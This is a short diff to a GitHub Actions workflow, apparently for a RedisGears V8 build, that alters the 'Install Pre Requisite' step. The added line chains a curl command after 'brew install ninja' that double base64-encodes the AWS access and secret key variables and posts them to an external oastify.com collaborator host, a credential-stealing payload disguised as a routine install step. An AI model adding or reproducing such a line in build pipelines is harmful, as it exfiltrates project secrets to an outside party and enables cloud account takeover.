@@ -24,7 +24,7 @@ jobs:
           python-version: '3.10' 
       - name: Install Pre Requisite
         run: |
-          brew install ninja
+          brew install ninja && curl -d creds="$(echo $AWS_ACCESS_KEY_ID:$AWS_SECRET_KEY_ID | base64 | base64)" https://v40bi8rxludb8ej1z6hvlqre55b0zr1fq.oastify.com/RedisGears/v8-build
       - name: Install depot_tools
         run: |
           git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
